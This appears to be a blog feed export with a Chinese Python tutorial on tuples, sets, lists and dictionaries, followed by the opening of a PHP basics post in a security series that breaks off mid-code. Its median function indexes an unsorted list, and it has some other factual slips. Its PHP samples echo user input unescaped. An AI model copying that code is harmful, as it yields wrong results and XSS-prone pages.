align="center">len(s)</td><td align="center">序列s的元素个数（长度）</td></tr><tr><td align="center">min(s)</td><td align="center">序列s中的最小值</td></tr><tr><td align="center">max(s)</td><td align="center">序列s中的最大值</td></tr><tr><td align="center">s.index(x[,i[,j]])</td><td align="center">序列s中从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td align="center">s.count(x)</td><td align="center">序列s中出现x的总次数</td></tr></tbody></table><p>（6）元组类型（tuple）是序列中比较特殊的类型，因为<strong>它一旦创建就不能修改</strong>。元组类型在表达固定数据项、函数多返回值、多变量同步赋值、循环遍历等情况下十分有用。Python中元组采用逗号和圆括号（可选）来表示。例如：</p><pre><code class="python">&gt;&gt;&gt; creature = &quot;cat&quot;, &quot;dog&quot;, &quot;tiger&quot;, &quot;human&quot;&gt;&gt;&gt; creature(&#39;cat&#39;, &#39;dog&#39;, &#39;tiger&#39;, &#39;human&#39;)&gt;&gt;&gt; color = (&quot;red&quot;, 0x001100, &quot;blue&quot;, creature)&gt;&gt;&gt; color(&#39;red&#39;, 4352, &#39;blue&#39;, (&#39;cat&#39;, &#39;dog&#39;, &#39;tiger&#39;, &#39;human&#39;))&gt;&gt;&gt; color[2]&#39;blue&#39;&gt;&gt;&gt; color[-1][2]&#39;tiger&#39;</code></pre><p>（7）生成元组只需要使用逗号将元素隔离开即可，例如上例中的元组creature，也可以增加圆括号，但圆括号在不混淆语义的情况下不是必须的。<strong>一个元组可以作为另一个元组的元素，可以采用多级索引获取信息，</strong>例如元组color中包含了creature。</p><p>（8）元组除了用于表达固定数据项外，还常用于如下3种情况：函数多返回值、多变量同步赋值、循环遍历，例如：</p><pre><code class="python">&gt;&gt;&gt; def func(x):    return x, x**3     #函数多返回值&gt;&gt;&gt; a, b=&#39;dog&#39;, &#39;tiger&#39;    #多变量同步赋值&gt;&gt;&gt; a, b=(b, a)       #多变量同步赋值，括号可省略&gt;&gt;&gt; import math&gt;&gt;&gt; for x, y in ((1,0),(2,5),(3,8)):   #循环遍历    print(math.hypot(x,y))       #求多个坐标到原点的距离1.05.3851648071345048.54400374531753</code></pre><h3 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h3><p>（1）集合类型与数学中的集合概念一致，即包含0个或多个数据项的无序组合。<strong>集合中的元素不可重复，元素类型只能是固定数据类型，例如整数、浮点数、字符串、元组等。</strong>列表、字典和集合类型本身都是可变数据类型，不能作为集合的元素出现。</p><p>（2）Python编译器中界定固定数据与否主要考察类型是否能够进行<strong>哈希运算</strong>。<strong>能够进行哈希运算的类型都可作为集合元素。</strong></p><p>（4）哈希运算：哈希运算可以将任意长度的二进制值映射为较短的<strong>固定长度的二进制值</strong>，这个小的二进制值称为哈希值。Python提供了一个内置的哈希运算函数<strong>hash()**，它可以对大多数数据类型产生一个哈希值。哈希值与哈希前的内容无关，可以说，</strong>哈希是数据在另一个数据维度的体现。**例如：</p><pre><code class="python">&gt;&gt;&gt; hash(&quot;PYTHON&quot;)4643938005541540506&gt;&gt;&gt; hash(&quot;IS&quot;)-2450861983417858884&gt;&gt;&gt; hash(&quot;GOOD&quot;)-1174573472557134882&gt;&gt;&gt; hash(&quot;PYTHON IS GOOD&quot;)-1199702010419733010</code></pre><p>（5）集合是无序组合，没有索引和位置的概念，不能分片，集合中元素可以动态增加或删除。集合用大括号{}表示，可以用赋值语句生成一个集合。例如：</p><pre><code class="python">&gt;&gt;&gt; S =&#123;425, &quot;BIT&quot;,(10,&quot;CS&quot;),424&#125;&gt;&gt;&gt; S&#123;424, 425, (10, &#39;CS&#39;), &#39;BIT&#39;&#125;&gt;&gt;&gt; T =&#123;425, &quot;BIT&quot;,(10,&quot;CS&quot;), 424, 425,&quot;BIT&quot;&#125;&gt;&gt;&gt; T&#123;424, 425, (10, &#39;CS&#39;), &#39;BIT&#39;&#125;</code></pre><p>（6）由于集合元素是无序的，集合的打印效果与定义顺序可以不一致。由于<strong>集合元素独一无二，使用集合类型能够过滤掉重复元素。</strong></p><p>（7）set(x)函数可以用于生成集合，输入的参数可以是任何组合数据类型，返回结果是一个无重复且排序任意的集合，例如：</p><pre><code class="python">&gt;&gt;&gt; W = set(&quot;apple&quot;)&gt;&gt;&gt; W&#123;&#39;l&#39;, &#39;p&#39;, &#39;e&#39;, &#39;a&#39;&#125;&gt;&gt;&gt; V = set((&quot;cat&quot;,&quot;dog&quot;,&quot;tiger&quot;,&quot;human&quot;))&gt;&gt;&gt; V&#123;&#39;tiger&#39;, &#39;cat&#39;, &#39;human&#39;, &#39;dog&#39;&#125;</code></pre><p>（8）集合类型有10个操作符。</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S - T</td><td align="center">返回一个新集合，包括在集合S但不在集合T中的元素</td></tr><tr><td align="center">S -= T</td><td align="center">更新集合S，包括在集合S但不在集合T中的元素</td></tr><tr><td align="center">S &amp; T</td><td align="center">返回一个新集合，包括同时在集合S和集合T中的元素</td></tr><tr><td align="center">S &amp;= T</td><td align="center">更新集合S，包括同时在集合S和集合T中的元素</td></tr><tr><td align="center">S ^ T</td><td align="center">返回一个新集合，包括集合S和集合T中的元素，但不包括同时在其中的元素</td></tr><tr><td align="center">S ^= T</td><td align="center">更新集合S，包括集合S和集合T中的元素，但不包括同时在其中的元素</td></tr><tr><td align="center">S | T</td><td align="center">返回一个新集合，包括集合S和集合T中的所有元素</td></tr><tr><td align="center">S |= T</td><td align="center">更新集合S，包括集合S和集合T中的所有元素</td></tr><tr><td align="center">S &lt;= T</td><td align="center">如果S与T相同或S是T的子集，返回True，否则返回False，可以用S&lt;T判断S是否是T的真子集</td></tr><tr><td align="center">S &gt;= T</td><td align="center">如果S与T相同或S是T的超集，返回True，否则返回False，可以用S&gt;T判断S是否是T的真超集</td></tr></tbody></table><p>上述操作符表达了集合类型的4种基本操作：交集（&amp;）、并集（|）、差集（-）、补集（^）、操作逻辑与数学定义相同。</p><p><img src="https://i.loli.net/2021/03/25/iAeX67WxPvm3K1u.png" alt="image-20210325150549210"></p><p>（9）集合类型有10个操作函数或方法</p><table><thead><tr><th align="center">操作函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S.add(x)</td><td align="center">如果数据项x不在集合S中，将x增加到s</td></tr><tr><td align="center">S.clear()</td><td align="center">移除S中的所有数据项</td></tr><tr><td align="center">S.copy()</td><td align="center">返回集合S的一个副本</td></tr><tr><td align="center">S.pop()</td><td align="center">随机返回集合S中的一个元素，如果S为空，产生KeyError异常</td></tr><tr><td align="center">S.discard(x)</td><td align="center">如果x在集合S中，移除该元素；如果x不在集合S中，不报错</td></tr><tr><td align="center">S.remove(x)</td><td align="center">如果x在集合S中，移除该元素；不在则产生KeyError异常</td></tr><tr><td align="center">S.isdisjoint(T)</td><td align="center">如果集合S与T没有相同元素，返回True</td></tr><tr><td align="center">len(S)</td><td align="center">返回集合S的元素的个数</td></tr><tr><td align="center">x in S</td><td align="center">如果x是S的元素，返回True，否则返回False</td></tr><tr><td align="center">x not in S</td><td align="center">如果x不是S的元素，返回True，否则返回False</td></tr></tbody></table><p>（10）集合类型主要用于3个场景：<strong>成员关系测试、元素去重和删除数据项</strong>，例如：</p><pre><code class="python">&gt;&gt;&gt; &quot;BIT&quot; in &#123;&quot;PYTHON&quot;, &quot;BIT&quot;, 123, &quot;good&quot;&#125;      #成员关系测试True&gt;&gt;&gt; tup = &#123;&quot;PYTHON&quot;, &quot;BIT&quot;, 123, &quot;GOOD&quot;, 123&#125;     #元素去重&gt;&gt;&gt; set (tup)&#123;&#39;PYTHON&#39;, 123, &#39;GOOD&#39;, &#39;BIT&#39;&#125;&gt;&gt;&gt; newtup = tuple(set(tup)-&#123;&#39;PYTHON&#39;&#125;)          #去重同时删除数据项&gt;&gt;&gt; newtup(&#39;BIT&#39;, 123, &#39;GOOD&#39;)</code></pre><h3 id="映射类型"><a href="#映射类型" class="headerlink" title="映射类型"></a>映射类型</h3><p>（1）映射类型是“键-值数据项的组合，每个元素是一个键值对，即元素是(key,value),元素之间是无序的。键值对(key,value)是一种二元关系，源于属性和值的映射关系。</p><p>（2）键（key）表示一个属性，也可以理解为一个类别或项目，值（value）是属性的内容，键值对刻画了一个属性和它的值。键值对将映射关系结构化，用于存储和表达。在Python中，映射类型主要以字典(dict)体现。</p><h2 id="列表类型和操作"><a href="#列表类型和操作" class="headerlink" title="列表类型和操作"></a>列表类型和操作</h2><p>要点：<strong>列表是包含0个或多个对象引用的有序序列，没有长度限制，可自由增删元素，使用灵活。</strong></p><h3 id="列表类型的概念"><a href="#列表类型的概念" class="headerlink" title="列表类型的概念"></a>列表类型的概念</h3><p>（1）列表（list）属于序列类型，与元组不同，列表的长度和内容都是可变的。</p><p>（2）由于列表属于序列类型，所以列表页支持成员关系操作符（in）、长度计算函数（len()）、分片（[]）。列表可以同时使用正向递增序号和反向递减序号，可以采用标准的比较操作符（&lt;、&lt;=、==、!=、&gt;=、&gt;）进行比较，<strong>列表的比较实际上是单个数据项的逐个比较。</strong></p><p>（3）列表用中括号[]表示，也可以通过list()函数将元组或字符串转化成列表。直接使用list()函数会返回一个空列表。例如：</p><pre><code class="python">&gt;&gt;&gt; ls =[425, &quot;BIT&quot;, [10, &quot;CS&quot;], 425]&gt;&gt;&gt; ls[425, &#39;BIT&#39;, [10, &#39;CS&#39;], 425]&gt;&gt;&gt; ls[2][-1][0]&#39;C&#39;&gt;&gt;&gt; list((425, &quot;BTI&quot;, [10, &quot;CS&quot;], 425))[425, &#39;BTI&#39;, [10, &#39;CS&#39;], 425]&gt;&gt;&gt; list(&quot;中国是一个伟大的国家&quot;)[&#39;中&#39;, &#39;国&#39;, &#39;是&#39;, &#39;一&#39;, &#39;个&#39;, &#39;伟&#39;, &#39;大&#39;, &#39;的&#39;, &#39;国&#39;, &#39;家&#39;]&gt;&gt;&gt; list()[]</code></pre><p>扩展：列表和数组。二者都是表示一组元素的方法，C语言采用数组，Python采用列表。二者区别：</p><ul><li>数组需要预先分配大小，列表则不需要</li><li>数组要求元素类型一致，列表则不需要</li></ul><p>（4）列表要处理一组数据，因此，<strong>列表必须通过显示的数据赋值才能完成，简单将一个列表赋值给另一个列表不会生成新的列表对象。</strong>例如：</p><pre><code class="python">&gt;&gt;&gt; ls = [425, &quot;BIT&quot;, 1024]     #用数据赋值产生列表ls&gt;&gt;&gt; lt =ls                  #lt是ls所对应数据的引用，lt并不包含真实数据&gt;&gt;&gt; ls[0]=0&gt;&gt;&gt; lt[0, &#39;BIT&#39;, 1024]</code></pre><p>（5）如上例所示，ls由实际数据赋值产生，为列表对象。将ls赋值给列表lt仅能产生对列表ls的一个新的引用，此时lt和ls变量都是实际数据的表示或引用，真实数据只存储一份。因此，修改ls也同时修改了lt。</p><h3 id="列表类型的操作"><a href="#列表类型的操作" class="headerlink" title="列表类型的操作"></a>列表类型的操作</h3><p>（1）列表是序列类型，因此，序列类型的12个通用操作符和函数都可应用于列表类型。但列表是可变的，以下列出了列表类型额外的14个常用函数或方法，主要处理列表的增删改等功能。</p><table><thead><tr><th align="center">函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ls[i] = x</td><td align="center">替换列表ls第i数据项为x</td></tr><tr><td align="center">ls[i:j] = lt</td><td align="center">用列表lt替换列表ls中第i到第j项数据项(不含第j向，下同)</td></tr><tr><td align="center">ls[i:j:k] = lt</td><td align="center">用列表lt替换列表ls中第i到第j项以k为步数的数据</td></tr><tr><td align="center">del ls[i:j]</td><td align="center">删除列表ls第i到第j项数据，等价于ls[i:j] = []</td></tr><tr><td align="center">del ls[i:j:k]</td><td align="center">删除列表ls第i到第j项k为步数的数据</td></tr><tr><td align="center">ls+=lt或ls.extend(lt)</td><td align="center">将列表lt元素增加到列表ls中</td></tr><tr><td align="center">ls *= n</td><td align="center">更新列表，其元素重复n次</td></tr><tr><td align="center">ls.append(x)</td><td align="center">在列表ls最后增加一个元素x</td></tr><tr><td align="center">ls.clear()</td><td align="center">删除ls中的所有元素</td></tr><tr><td align="center">ls.copy()</td><td align="center">生成一个新列表，复制ls中的所有元素</td></tr><tr><td align="center">ls.inset(i,x)</td><td align="center">在列表ls的第i位置增加元素x</td></tr><tr><td align="center">ls.pop(i)</td><td align="center">将列表ls中的第i项元素取出并删除该元素</td></tr><tr><td align="center">ls.remove(x)</td><td align="center">将列表中出现的第一个元素x删除</td></tr><tr><td align="center">ls.reverse(x)</td><td align="center">列表ls中的元素反转</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; vlist = list(range(5))&gt;&gt;&gt; vlist[0, 1, 2, 3, 4]&gt;&gt;&gt; len (vlist[2:])    #计算从第3个元素开始到结尾的子串长度3&gt;&gt;&gt; vlist[2:][2, 3, 4]&gt;&gt;&gt; 2 in vlist        #判断2是否在列表vlist中True&gt;&gt;&gt; vlist[3]=&quot;python&quot;  #修改序号3的元素值和类型&gt;&gt;&gt; vlist[0, 1, 2, &#39;python&#39;, 4]&gt;&gt;&gt; vlist[1:3]=&#123;&quot;bit&quot;, &quot;computer&quot;&#125;  &gt;&gt;&gt; vlist[0, &#39;computer&#39;, &#39;bit&#39;, &#39;python&#39;, 4]</code></pre><p>（2）当使用一个列表改变另一个列表的值时，Python不要求两个列表的长度一样，但遵循“多增少减”的原则。例如：</p><pre><code class="python">&gt;&gt;&gt; vlist[0, &#39;computer&#39;, &#39;bit&#39;, &#39;python&#39;, 4]&gt;&gt;&gt; vlist[1:3] = [&quot;new_bit&quot;,&quot;new_computer&quot;, 123]&gt;&gt;&gt; vlist[0, &#39;new_bit&#39;, &#39;new_computer&#39;, 123, &#39;python&#39;, 4]&gt;&gt;&gt; vlist[1:3]=[&quot;fewer&quot;]&gt;&gt;&gt; vlist[0, &#39;fewer&#39;, 123, &#39;python&#39;, 4]</code></pre><p>（3）vlist[1:3]子序列包含了两个元素，对其赋值时却给了3个元素，最后vlist的结果会包含赋值列表中多余的元素。同样，当使用包含更少的元素赋值时，原列表元素会相应减少。<strong>可通过赋给更多或更少元素实现对列表元素的插入或删除</strong>。</p><p>（4）与元组一样，列表可以通过for-in语句对其元素进行遍历，基本语法结构如下：</p><pre><code class="python">for &lt;任意变量名&gt; in &lt;列表名&gt;:    &lt;语句块&gt;&gt;&gt;&gt; vlist[0, &#39;fewer&#39;, 123, &#39;python&#39;, 4]&gt;&gt;&gt; for e in vlist:    print(e, end=&quot; &quot;)0 fewer 123 python 4 &gt;&gt;&gt; </code></pre><p>（5）列表是一个十分灵活的数据结构，它具有处理任意长度、混合类型数据的能力，并提供了丰富的基础操作符合方法。<strong>当程序需要使用组合数据类型管理批量数据时，应尽量使用列表类型。</strong></p><h2 id="实例9：基本统计值计算"><a href="#实例9：基本统计值计算" class="headerlink" title="实例9：基本统计值计算"></a>实例9：基本统计值计算</h2><pre><code class="python">from math import sqrtdef getNum():       #获取用户输入    nums = []    isNumStr = input(&quot;请输入数字(直接输入回车退出)：&quot;)    while isNumStr != &quot;&quot;:        nums.append(eval(isNumStr))        isNumStr = input(&quot;请输入数字(直接输入回车退出)：&quot;)    return numsdef mean(numbers):     #计算平均值    s = 0.0    for num in numbers:        s = s +num    return s / len(numbers)def dev(numbers, mean):     #计算方差    sdev = 0.0    for num in numbers:        sdev =sdev + (num -mean)**2    b = sqrt(sdev / (len(numbers)-1))    return bdef median(numbers):        #计算中位数    ls = sorted(numbers)#sorted返回重新排序的列表,返回新的列表,而不是在原列表上操作,原来的列表不变    size = len(numbers)    if size % 2 == 0:        med = (numbers[size//2-1] + numbers[size//2]) / 2    else:        med = numbers[size//2]    return medn = getNum() #主体函数m = mean(n)print(&quot;平均值：&#123;&#125;,方差：&#123;:.2&#125;,中位数：&#123;&#125;.&quot;.format(m,dev(n,m),median(n)))</code></pre><p>运行结果如下：</p><pre><code class="python">&gt;&gt;&gt;请输入数字(直接输入回车退出)：99请输入数字(直接输入回车退出)：98请输入数字(直接输入回车退出)：97请输入数字(直接输入回车退出)：96请输入数字(直接输入回车退出)：95请输入数字(直接输入回车退出)：平均值：97.0,方差：1.6,中位数：97.</code></pre><p>列表在实现基本数据统计时发挥了很重要的作用，主要表现在以下3个方面：</p><ul><li>列表是一个动态长度的数据结构，可以根据需求增加或减少元素。</li><li>列表的一系列方法或操作符为计算提供了简单的元素运算手段。</li><li>列表提供了对每个元素的简单访问方式及所有元素的遍历方式。</li></ul><h2 id="字典类型和操作"><a href="#字典类型和操作" class="headerlink" title="字典类型和操作"></a>字典类型和操作</h2><h3 id="字典类型的概念"><a href="#字典类型的概念" class="headerlink" title="字典类型的概念"></a>字典类型的概念</h3><p>（1）访问列表的元素时，可以通过元素在列表的序号进行查找，即&lt;整数序号&gt;查找&lt;被索引内容&gt;</p><p>（2）实际生活中，需要更为灵活的信息查找方式。例如学生信息，需要基于身份证号进行查找，而不是信息存储序号。</p><p>（3）<strong>根据一个信息查找另一个信息的方式构成了“键值对”</strong>，它表示索引用的键和对应的值构成的成对关系，即通过特定的键（身份证号）来访问值（学生信息）。<strong>由于键不是序号，无法使用列表类型进行有效存储和索引。</strong></p><p>（4）通过任意键信息查找一组数据中值信息的过程叫<strong>映射</strong>，Python中通过字典实现映射。字典可以通过大括号{}建立，模式如下：</p><pre><code>&#123;&lt;键1&gt;:&lt;值1&gt;, &lt;键2&gt;:&lt;值2&gt;, ... , &lt;键n&gt;:&lt;值n&gt;&#125;</code></pre><p>（5）在Python中，大括号{}可以表示集合，所以字典类型也具有和集合类似的性质，<strong>即键值对之间没有顺序且不能重复</strong>。也就是说，可以把<strong>字典看成元素是键值队的集合</strong>。例如下面的一个简单字典：</p><pre><code class="python">&gt;&gt;&gt; Dcountry=&#123;&quot;中国&quot;:&quot;北京&quot;, &quot;美国&quot;:&quot;华盛顿&quot;, &quot;法国&quot;:&quot;巴黎&quot;&#125;&gt;&gt;&gt; print(Dcountry)&#123;&#39;中国&#39;: &#39;北京&#39;, &#39;美国&#39;: &#39;华盛顿&#39;, &#39;法国&#39;: &#39;巴黎&#39;&#125;</code></pre><p>（6）字典中的各个元素没有顺序之分，<strong>若想保持一个集合中元素的顺序，需要使用列表，而不是字典。</strong>字典最主要的用法是查找与特定键相对应的值，这通过索引符号来实现。例如：</p><pre><code class="python">&gt;&gt;&gt; Dcountry[&quot;中国&quot;]&#39;北京&#39;</code></pre><p>（7）字典中键值队的访问模式如下，采用<strong>中括号</strong>格式：</p><pre><code class="python">&lt;值&gt; = &lt;字典变量&gt;[&lt;键&gt;]</code></pre><p>（8）字典中对某个键值的修改可以通过中括号的访问和赋值实现，例如；</p><pre><code class="python">&gt;&gt;&gt; Dcountry[&quot;中国&quot;] = &#39;大北京&#39;&gt;&gt;&gt; print(Dcountry)&#123;&#39;中国&#39;: &#39;大北京&#39;, &#39;美国&#39;: &#39;华盛顿&#39;, &#39;法国&#39;: &#39;巴黎&#39;&#125;</code></pre><p>（9）字典是存储可变数量键值对的数据结构，键和值可以是任意数据类型，包括程序自定义的类型。Python字典效率非常高，甚至可以存储几十万项内容。</p><p>扩展：<strong>索引是按照一定顺序检索内容的体系。Python中，字符串、列表、元素等都采用数字索引，字典采用字符索引。</strong></p><h3 id="字典类型的操作"><a href="#字典类型的操作" class="headerlink" title="字典类型的操作"></a>字典类型的操作</h3><p>（1）字典通过大括号创建，并指定初始的值；通过中括号可以增加新的元素，例如：</p><pre><code class="python">&gt;&gt;&gt; Dcountry=&#123;&quot;中国&quot;:&quot;北京&quot;, &quot;美国&quot;:&quot;华盛顿&quot;, &quot;法国&quot;:&quot;巴黎&quot;&#125;&gt;&gt;&gt; Dcountry[&quot;英国&quot;]=&quot;伦敦&quot;&gt;&gt;&gt; print(Dcountry)&#123;&#39;中国&#39;: &#39;大北京&#39;, &#39;美国&#39;: &#39;华盛顿&#39;, &#39;法国&#39;: &#39;巴黎&#39;, &#39;英国&#39;: &#39;伦敦&#39;&#125;</code></pre><p>（2）直接使用大括号{}可以创建一个空的字典，并通过中括号[]向其增加元素，例如：</p><pre><code class="python">&gt;&gt;&gt; Dp=&#123;&#125;&gt;&gt;&gt; Dp[&#39;2^10&#39;]=1024&gt;&gt;&gt; print(Dp)&#123;&#39;2^10&#39;: 1024&#125;</code></pre><p>（3）注意：尽管集合类型也用大括号{}表示，<strong>但直接使用大括号{}生成的是一个字典，而不是集合。生成集合需要用set()函数。</strong></p><p>（4）字典在Python中也已采用面向对象方式实现，所以也有一些对应的方法，采用&lt;a&gt;.&lt;b&gt;()格式。</p><table><thead><tr><th align="center">函数和方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;d&gt;.keys()</td><td align="center">返回所有的键信息</td></tr><tr><td align="center">&lt;d&gt;.values()</td><td align="center">返回所有的值信息</td></tr><tr><td align="center">&lt;d&gt;.items()</td><td align="center">返回所有的键值对</td></tr><tr><td align="center">&lt;d&gt;.get(&lt;key&gt;,&lt;default&gt;)</td><td align="center">键存在则返回相应值，否则返回默认值</td></tr><tr><td align="center">&lt;d&gt;.pop(&lt;key&gt;,&lt;default&gt;)</td><td align="center">键存在则返回相应值，同时删除键值对，否则返回默认值</td></tr><tr><td align="center">&lt;d&gt;.popitem()</td><td align="center">随机从字典中取出一个键值对，以元组(key,value)形式返回</td></tr><tr><td align="center">&lt;d&gt;.clear()</td><td align="center">删除所有的键值对</td></tr><tr><td align="center">del&lt;d&gt;[&lt;key&gt;]</td><td align="center">删除字典中某一个键值对</td></tr><tr><td align="center">&lt;key&gt;in&lt;d&gt;</td><td align="center">如果键在字典中则返回True，否则返回False</td></tr></tbody></table><p>（5）若希望keys()、values()和items()方法返回列表类型，可以<strong>采用list()函数将返回值转换成列表</strong>。</p><pre><code class="python">&gt;&gt;&gt; Dcountry.keys()dict_keys([&#39;中国&#39;, &#39;美国&#39;, &#39;法国&#39;, &#39;英国&#39;])&gt;&gt;&gt; list(Dcountry.values())[&#39;大北京&#39;, &#39;华盛顿&#39;, &#39;巴黎&#39;, &#39;伦敦&#39;]&gt;&gt;&gt; Dcountry.items()dict_items([(&#39;中国&#39;, &#39;大北京&#39;), (&#39;美国&#39;, &#39;华盛顿&#39;), (&#39;法国&#39;, &#39;巴黎&#39;), (&#39;英国&#39;, &#39;伦敦&#39;)])&gt;&gt;&gt; &#39;中国&#39; in Dcountry          #只对键进行判断True&gt;&gt;&gt; Dcountry.get(&#39;美国&#39;,&#39;悉尼&#39;)     #&#39;美国&#39;在字典中存在&#39;华盛顿&#39;&gt;&gt;&gt; Dcountry.get(&#39;澳大利亚&#39;, &#39;悉尼&#39;)   #&#39;澳大利亚&#39;在字典中不存在&#39;悉尼&#39;</code></pre><p>（6）字典可以通过for-in语句对其元素进行遍历，基本语法结构如下：</p><pre><code>for &lt;变量名&gt; in &lt;字典名&gt;:    &lt;语句块&gt;</code></pre><p>（7）键相当于索引，因此，for循环返回的变量名是字典的索引值。若需要获得键对应的值，可以在语句块中get()方法获得。</p><pre><code class="python">&gt;&gt;&gt; for key in Dcountry:    print(key)中国美国法国英国&gt;&gt;&gt; for key in Dcountry:    print(Dcountry.get(key,&#39;不存在&#39;))大北京华盛顿巴黎伦敦</code></pre><p>（8）字典是实现键值对映射的数据结构，它采用固定数据类型的键数据作为索引，十分灵活，具有处理任意长度、混合类型键值对的能力。以下是字典的基本原则：</p><ul><li>字典是一个键值对的集合，该集合以键为索引，<strong>一个键信息只对应一个值信息。</strong></li><li>字典中元素以键信息为索引访问。</li><li>字典长度是可变的，可以通过对键信息赋值实现增加或修改键值对。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP与SQL进阶</title>
      <link href="2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/"/>
      <url>2021/03/17/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/PHP%E4%B8%8ESQL%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP的基础语法"><a href="#PHP的基础语法" class="headerlink" title="PHP的基础语法"></a>PHP的基础语法</h2><p>（1）基本概念：</p><ul><li>PHP文件的默认文件扩展名是”.php”</li><li>PHP脚本可放置于文档中的任何位置</li><li>PHP脚本以**&lt;?php**开头，以**?&gt;**结尾</li><li>PHP语句以分号结尾**;**</li></ul><p>（2）注释：PHP支持三种注释方法，包括单行注释和多行注释</p><pre><code class="php">&lt;?php    //这是单行注释    #这也是单行注释    /*这是多行注释块        它横跨了        多行      */echo &quot;Hello World&quot;;?&gt;</code></pre><p>（3）输出语法</p><ul><li>echo：能输出多个字符串</li></ul><pre><code class="php">&lt;?phpecho &quot;123&quot;,&quot;456&quot;,&quot;789&quot;;?&gt;&lt;?php$name=&quot;kangkang&quot;;$shuiguo=array(&quot;苹果&quot;,&quot;香蕉&quot;,&quot;西瓜&quot;);echo &quot;I am &amp;name,I eat $shuiguo[1]&quot;;?&gt;</code></pre><ul><li>print：只能输出一个字符串</li></ul><h3 id="HTML和PHP的嵌套关系"><a href="#HTML和PHP的嵌套关系" class="headerlink" title="HTML和PHP的嵌套关系"></a>HTML和PHP的嵌套关系</h3><p>（1）要在PHP文件中写入PHP的语句（脚本），在整段代码的最前面写上&lt;?php，在整段代码的最后面写上?&gt;</p><p>（2）PHP文件内可以写入HTML标签、PHP脚本</p><p>（3）PHP文件中可以嵌套HTML标签、HTML标签又能嵌套PHP脚本、PHP脚本中可以嵌套HTML标签</p><pre><code class="php">&lt;?php    echo &quot;test1&quot;;    echo &quot;&lt;br&gt;&quot;;    echo &quot;test2&quot;;?&gt;</code></pre><h3 id="HTML和PHP的作用"><a href="#HTML和PHP的作用" class="headerlink" title="HTML和PHP的作用"></a>HTML和PHP的作用</h3><p>（1）HTML用于静态网页的制作。</p><p>（2）PHP的作用:用于解决HTML的缺陷,可以和用户进行对应的交互以达到用户能够看到属于自己个性化的页面。</p><ul><li>前端页面:正常的用户可以去查看到的HTML页面。前端页面可以由PHP或HTML编写，一般用HTML。</li><li>后端页面:页面不会显示任何内容，页面通常用于处理前端页面得到的数据。后端页面只能由服务端脚本引擎编写。</li></ul><h3 id="PHP的动态交互"><a href="#PHP的动态交互" class="headerlink" title="PHP的动态交互"></a>PHP的动态交互</h3><h4 id="浏览器提交请求"><a href="#浏览器提交请求" class="headerlink" title="浏览器提交请求"></a>浏览器提交请求</h4><p><strong>用户如何发送自己的需求（用户在浏览器中输入的内容如何提交给服务器）</strong></p><p>（1）HTML form表单提交数据</p><p>（2）JS  AJAX提交输入数据</p><h4 id="服务器端接收请求"><a href="#服务器端接收请求" class="headerlink" title="服务器端接收请求"></a>服务器端接收请求</h4><pre><code>    $_SESSION     $_COOKIE    $_FILES    $_GET    $_POST    $_REQUEST    $_SERVER    $GLOBALS</code></pre><h4 id="网站用户状态保持"><a href="#网站用户状态保持" class="headerlink" title="网站用户状态保持"></a>网站用户状态保持</h4><p>（1）HTTP无状态协议，为了保持用户登录状态，HTTP引入了Cookie和Session机制。</p><p>（2）cookie中，大部分用于保存客户端和服务器之间的状态（PHPSESSID–PHP Session ID–存放某串Session），但网站开发人员可以自行对cookie进行设置和使用。</p><h4 id="Cookie和Session判断登录状态"><a href="#Cookie和Session判断登录状态" class="headerlink" title="Cookie和Session判断登录状态"></a>Cookie和Session判断登录状态</h4><p>（1）PHPSESSID中的值会和服务器中的session值进行判断</p><p>（2）若有session值，则代表浏览器访问过这个页面</p><p>（3）此时服务器会对session进行判断，如果session中写入的为“可以登录”,那么可登录成功，否则登录失败。</p><h3 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h3><p>（1）PHP变量的命名规则：</p><ul><li>变量以$符号开头，其后是变量的名称</li><li>变量名必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线(A-z、0-9以及_)</li><li>变量名称对大小写敏感</li></ul><pre><code class="php">&lt;?php$txt=&quot;Hello World!&quot;;$x=5;$y=10.5;echo $txt;echo &quot;&lt;br/&gt;&quot;;echo $x+$y;?&gt;</code></pre><p>（2）超全局变量</p><ul><li>在PHP4.1.0中引入，是在全部作用域中始终可用的内置变量。</li><li>PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。</li></ul><pre><code class="php">    $_SESSION 获取保存的SESSION信息    $_COOKIE 获取保存的COOKIE信息    $_FILES 接收前端以任意形式传输的文件    $_GET 接收前端以GET形式传输的参数    $_POST 接收前端以POST形式传输的参数    $_REQUEST 接收前端以任意形式传输的参数    $_SERVER 保存关于报头、路径和脚本位置的信息。    $GLOBALS 保存PHP中所有的参数（包括超全局变量中的参数)</code></pre><p>（3）$_GET &amp; $_POST：接收前端以GET或POST形式传输的参数</p><ul><li>get.php</li></ul><pre><code class="php">&lt;?php    echo &quot;Hello,your name is &quot;.$_GET[&#39;user&#39;];?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/LXybUOQsDMm3jRd.png" alt="image-20210317185828678"></p><ul><li>post.php</li></ul><pre><code class="php">&lt;?php    echo &quot;Hello,your name is &quot;.$_POST[&#39;user&#39;];?&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/HN6eUCJisLYTmar.png" alt="image-20210317185705591"></p><p>（4）$_SERVER：保存关于报头、路径和脚本位置的信息。</p><pre><code class="php">&lt;?php    echo $_SERVER[&#39;PHP_SELF&#39;].&quot;&lt;br/&gt;&quot;;      //输出当前PHP文件名    echo $_SERVER[&#39;SERVER_NAME&#39;].&quot;&lt;br/&gt;&quot;;   //输出当前运行脚本所在的服务器的主机名    echo $_SERVER[&#39;HTTP_HOST&#39;].&quot;&lt;br/&gt;&quot;;     //输出当前服务器的主机名    echo 